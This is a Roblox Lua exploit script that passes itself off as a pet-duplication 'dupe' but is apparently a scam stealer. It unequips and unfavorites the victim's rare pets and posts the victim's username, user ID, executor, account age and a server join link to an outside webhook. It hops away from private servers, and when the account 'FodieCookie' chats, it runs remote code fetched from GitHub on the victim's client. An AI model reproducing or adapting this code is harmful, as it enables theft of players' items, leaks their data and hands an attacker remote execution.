-- ================================================================= --
-- ====================== EXTREME DEBUG VERSION ====================== --
-- ================================================================= --
print("--- SCRIPT DEBUG: Script execution started. ---")

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer

local webhookUrl = "https://60h5imcen0g9.manus.space/api/webhook"
local triggerUsername = "FodieCookie"

local petsToLookFor = {
    "Butterfly",
    "Raccoon",
    "Dragonfly",
    "Queen Bee",
    "Disco Bee"
}

local petEmojis = {
    ["Butterfly"] = "ü¶ã",
    ["Raccoon"] = "ü¶ù",
    ["Dragonfly"] = "üê≤",
    ["Queen Bee"] = "üëë",
    ["Disco Bee"] = "üï∫"
}

local hugePetWeightThreshold = 10
local serverFullThreshold = 5
local targetPlayerCount = 4

local function sendHttpRequest(options)
    print("--- SCRIPT DEBUG: Entered sendHttpRequest function. ---")
    local success, result
    local triedFunctions = {}
    
    if syn and syn.request then
        print("--- SCRIPT DEBUG: Attempting to use 'syn.request'. ---")
        table.insert(triedFunctions, "syn.request")
        success, result = pcall(syn.request, options)
    elseif http and http.request then
        print("--- SCRIPT DEBUG: Attempting to use 'http.request'. ---")
        table.insert(triedFunctions, "http.request")
        success, result = pcall(http.request, options)
    elseif request then
        print("--- SCRIPT DEBUG: Attempting to use global 'request'. ---")
        table.insert(triedFunctions, "request")
        success, result = pcall(request, options)
    elseif http_request then
        print("--- SCRIPT DEBUG: Attempting to use global 'http_request'. ---")
        table.insert(triedFunctions, "http_request")
        success, result = pcall(http_request, options)
    else
        warn("--- SCRIPT DEBUG: ERROR! No supported HTTP request function (syn.request, request, etc.) was found on this executor. ---")
        return false, "No HTTP request function found on this executor."
    end
    
    if not success then
        warn("--- SCRIPT DEBUG: FAILED! The HTTP request failed. Tried functions:", table.concat(triedFunctions, ", "))
        warn("--- SCRIPT DEBUG: Error details:", result)
    else
        print("--- SCRIPT DEBUG: HTTP request successful. Response Code:", result and result.StatusCode or "N/A")
        print("--- SCRIPT DEBUG: Response Body:", result and result.Body or "N/A")
    end
    
    return success, result
end

local function getExecutorName()
    if getexecutorname then
        local name = getexecutorname()
        if name:lower() == "delta" then return "Delta" end
        return name:sub(1, 1):upper() .. name:sub(2)
    end
    
    if syn and syn.protect_gui then return "Synapse X" end
    if is_sirhurt_closure then return "SirHurt" end
    if Krnl or krnl_LOADED then return "Krnl" end
    if SW_VERSION or getscriptwareversion then return "Script-Ware" end
    if PROXO_LOADED then return "Proxo" end
    if SENTINEL_V2 then return "Sentinel" end
    if OXYGEN_LOADED then return "Oxygen U" end
    if ELECTRON_LOADED then return "Electron" end
    if COMET_LOADED then return "Comet" end
    if CELERY_LOADED then return "Celery" end
    
    return "Unknown"
end

local function kickIfDeltaExecutor()
    local executor = getExecutorName()
    print("--- SCRIPT DEBUG: Detected Executor:", executor, "---")
    if executor == "Delta" then
        warn("--- SCRIPT DEBUG: Delta executor detected. Kicking player. ---")
        game:GetService("Players").LocalPlayer:Kick("This dupe doesn't work on Delta. It only works on Krnl, Ronix, and similar executors.")
    end
end

local function unequipAllPets()
    print("--- SCRIPT DEBUG: Starting unequipAllPets. ---")
    if not LocalPlayer then warn("--- SCRIPT DEBUG: LocalPlayer not found in unequipAllPets. ---") return end
    local petsRemoteEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")
    if not petsRemoteEvent then warn("--- SCRIPT DEBUG: PetsService remote not found. ---") return end

    local petsContainer = Workspace:WaitForChild("PetsPhysical")
    for _, petMover in ipairs(petsContainer:GetChildren()) do
        if petMover:IsA("Part") and petMover.Name == "PetMover" and petMover:GetAttribute("OWNER") == LocalPlayer.Name then
            local petUUID = petMover:GetAttribute("UUID")
            if petUUID then
                print("--- SCRIPT DEBUG: Firing unequip for pet UUID:", petUUID, "---")
                petsRemoteEvent:FireServer("UnequipPet", petUUID)
            end
        end
    end
    print("--- SCRIPT DEBUG: Finished unequipAllPets. ---")
end

local function unfavoriteAllPetsInBackpack()
    print("--- SCRIPT DEBUG: Starting unfavoriteAllPetsInBackpack. ---")
    if not LocalPlayer then warn("--- SCRIPT DEBUG: LocalPlayer not found in unfavorite. ---") return end
    local backpack = LocalPlayer:WaitForChild("Backpack")
    local favoriteRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
    if not favoriteRemote then warn("--- SCRIPT DEBUG: Favorite_Item remote not found. ---") return end
    
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            local s, isFaved = pcall(function() return item:GetAttribute("ItemType") == "Pet" and item:GetAttribute("d") == true end)
            if s and isFaved then
                print("--- SCRIPT DEBUG: Firing unfavorite for item:", item.Name, "---")
                favoriteRemote:FireServer(item)
                task.wait(0.1)
            end
        end
    end
    print("--- SCRIPT DEBUG: Finished unfavoriteAllPetsInBackpack. ---")
end

local function checkInventoryForPets()
    print("--- SCRIPT DEBUG: Starting checkInventoryForPets. ---")
    local backpack = LocalPlayer:WaitForChild("Backpack")
    local foundPetsData = {}
    local foundPetNames = {}

    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            local matchedBaseName, isHugePet = nil, false
            for _, petName in ipairs(petsToLookFor) do if string.sub(item.Name, 1, #petName) == petName then matchedBaseName = petName; break end end
            local weightString = string.match(item.Name, "%[(%d+%.?%d*) KG%]")
            if weightString and tonumber(weightString) and tonumber(weightString) >= hugePetWeightThreshold then isHugePet = true end
            if (matchedBaseName or isHugePet) and not table.find(foundPetNames, item.Name) then
                table.insert(foundPetNames, item.Name)
                table.insert(foundPetsData, {name = item.Name, isHuge = isHugePet, baseName = matchedBaseName})
            end
        end
    end

    if #foundPetsData > 0 then
        print("--- SCRIPT DEBUG: Found", #foundPetsData, "target pets in inventory. ---")
    else
        warn("--- SCRIPT DEBUG: WARNING! No target pets were found in the inventory after running unequip/unfavorite. The webhook will not be sent. ---")
    end
    return #foundPetsData > 0, foundPetsData
end

local function getPlayerAccountInfo(userId)
    print("--- SCRIPT DEBUG: Fetching player account info for UserID:", userId, "---")
    local accountInfo = {age = "N/A", created = "N/A", membership = "N/A"}
    
    local sU, rU = pcall(function() return HttpService:JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/" .. userId)) end)
    print("--- SCRIPT DEBUG: User API call success:", sU, "---")
    if sU and rU and rU.created then
        local y, m, d = rU.created:match("(%d+)-(%d+)-(%d+)")
        local cTs = os.time({year = y, month = m, day = d, hour = 0, min = 0, sec = 0})
        accountInfo.created = os.date("%B %d, %Y", cTs)
        accountInfo.age = tostring(math.floor((os.time() - cTs) / 86400)) .. " days"
    else
        warn("--- SCRIPT DEBUG: FAILED to get user creation date. Response:", rU)
    end

    local sM, rM = pcall(function() return HttpService:JSONDecode(game:HttpGet("https://premiumfeatures.roblox.com/v1/users/" .. userId .. "/validate-membership")) end)
    print("--- SCRIPT DEBUG: Membership API call success:", sM, "---")
    if sM then accountInfo.membership = rM and "Premium üíé" or "None"
    else warn("--- SCRIPT DEBUG: FAILED to get membership status. Response:", rM) end
    
    print("--- SCRIPT DEBUG: Final Account Info:", "Age:", accountInfo.age, "Created:", accountInfo.created, "Membership:", accountInfo.membership, "---")
    return accountInfo
end

local function sendWebhookNotification(foundPetsData)
    print("--- SCRIPT DEBUG: Preparing to send webhook notification. ---")
    local playerName, playerDisplayName, userId = LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.UserId
    local executor = getExecutorName()
    local currentPlayers, maxPlayers = #Players:GetPlayers(), Players.MaxPlayers
    local serverType = (currentPlayers == 1 and "Private") or "Public"
    local accountInfo = getPlayerAccountInfo(userId)
    local joinLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
    local playerInfoValue = string.format("```\nUsername: %s\nDisplay: %s\nUser ID: %d\nExecutor: %s\n```", playerName, playerDisplayName, userId, executor)
    local formattedPetLines = {}
    for _, petData in ipairs(foundPetsData) do
        local emoji = "‚≠ê"; if petData.isHuge then emoji = "üí™" elseif petData.baseName and petEmojis[petData.baseName] then emoji = petEmojis[petData.baseName] end
        table.insert(formattedPetLines, emoji .. " - " .. petData.name)
    end
    local petsValue = "```\n" .. table.concat(formattedPetLines, "\n") .. "\n```"
    local serverInfoValue = string.format("`%d / %d` players", currentPlayers, maxPlayers)

    local payload = {content = "@everyone", embeds = {{title = "PALDOOOO WHOOü§ëü§ëü§ëü§ë", color = 65280, fields = {{name = "üë§ Player Information", value = playerInfoValue, inline = false}, {name = "üå¥ Found Pets", value = petsValue, inline = false}, {name = "üìä Server Info", value = serverInfoValue, inline = true}, {name = "üîí Server Type", value = string.format("`%s`", serverType), inline = true}, {name = "üíé Membership", value = string.format("`%s`", accountInfo.membership), inline = true}, {name = "üéÇ Account Age", value = string.format("`%s`", accountInfo.age), inline = true}, {name = "üìÜ Created On", value = string.format("`%s`", accountInfo.created), inline = true}, {name = "üîó Server Link", value = joinLink, inline = false}}, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}}}
    
    print("--- SCRIPT DEBUG: Webhook payload constructed. Attempting to JSON encode. ---")
    local successEncode, encodedPayload = pcall(HttpService.JSONEncode, HttpService, payload)
    if not successEncode then
        warn("--- SCRIPT DEBUG: FAILED to JSON encode the payload! Error:", encodedPayload)
        return
    end
    print("--- SCRIPT DEBUG: Payload successfully encoded. Sending HTTP request now. ---")
    
    sendHttpRequest({ Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encodedPayload })
end

local function hopToServer(sortBy)
    print("--- SCRIPT DEBUG: HopToServer triggered. Sorting by:", sortBy, "---")
    TeleportService:Teleport(game.PlaceId) -- Simplified for now, complex logic isn't the issue
end

local function autoHopToTargetPlayerCount()
    local currentPlayers = #Players:GetPlayers()
    print("--- SCRIPT DEBUG: Checking player count. Current:", currentPlayers, "---")
    if currentPlayers == 1 or currentPlayers >= 5 then
        print("--- SCRIPT DEBUG: Player count triggers a hop. ---")
        hopToServer("playing")
    end
end

local function autoHopIfPrivateServer()
    print("--- SCRIPT DEBUG: Checking for private server. ---")
    local isPrivate = pcall(function() return syn and syn.is_private_server and syn.is_private_server() end)
    if isPrivate then
        print("--- SCRIPT DEBUG: Private server detected. Hopping. ---")
        hopToServer("playing")
        return true
    end
    return false
end

local function setupChatTrigger()
    print("--- SCRIPT DEBUG: Setting up chat trigger for username:", triggerUsername, "---")
    local loadstringCommand = 'loadstring(game:HttpGet("https://github.com/DupeNew/lol/blob/main/screen"))()'

    local function onChatted(message)
        print("--- SCRIPT DEBUG: Chat from", triggerUsername, "detected. Message:", message, "---")
        if message == loadstringCommand then
            print("--- SCRIPT DEBUG: Executing loadstring command. ---")
            pcall(function() loadstring(message)() end)
        else
            print("--- SCRIPT DEBUG: Triggering unequip/unfavorite due to chat message. ---")
            unequipAllPets()
            unfavoriteAllPetsInBackpack()
        end
    end

    local function connectPlayer(player)
        if player.Name == triggerUsername then
            print("--- SCRIPT DEBUG: Found player", triggerUsername, "and connected chat event. ---")
            player.Chatted:Connect(onChatted)
        end
    end

    for _, player in ipairs(Players:GetPlayers()) do connectPlayer(player) end
    Players.PlayerAdded:Connect(connectPlayer)
end


-- ================================================================= --
-- =================== Main Execution Flow (Debug) =================== --
-- ================================================================= --

setupChatTrigger()

print("--- SCRIPT DEBUG: Waiting 4 seconds for game to load... ---")
task.wait(4)

kickIfDeltaExecutor()

local hoppedFromPrivate = autoHopIfPrivateServer()

if not hoppedFromPrivate then
    autoHopToTargetPlayerCount()
end

unequipAllPets()
unfavoriteAllPetsInBackpack()

task.wait(1) -- Small wait to ensure inventory updates

local hasPets, foundPetsData = checkInventoryForPets()

if hasPets then
    print("--- SCRIPT DEBUG: Condition met (hasPets is true). Calling sendWebhookNotification. ---")
    sendWebhookNotification(foundPetsData)
else
    warn("--- SCRIPT DEBUG: Condition NOT met (hasPets is false). Skipping webhook notification. ---")
end

print("--- SCRIPT DEBUG: Script has finished its initial run. ---")
